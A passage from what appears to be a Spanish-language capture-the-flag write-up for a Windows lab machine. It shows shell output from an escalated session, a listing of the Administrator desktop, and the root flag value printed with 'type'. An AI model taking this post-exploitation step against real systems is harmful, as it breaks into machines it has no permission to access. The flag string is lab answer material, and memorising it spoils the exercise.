   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\Temp\PrivEsc>
```

### Búsqueda de flag Admin

- En Desktop Admin... que raro... 

```bat
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\Administrator\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
08/01/2023  04:52 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5.617.573.888 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ae9316eb80ef821757ec99fd5ee75c2c

C:\Users\Administrator\Desktop>
```

### PoC

- I'm Fz3r0
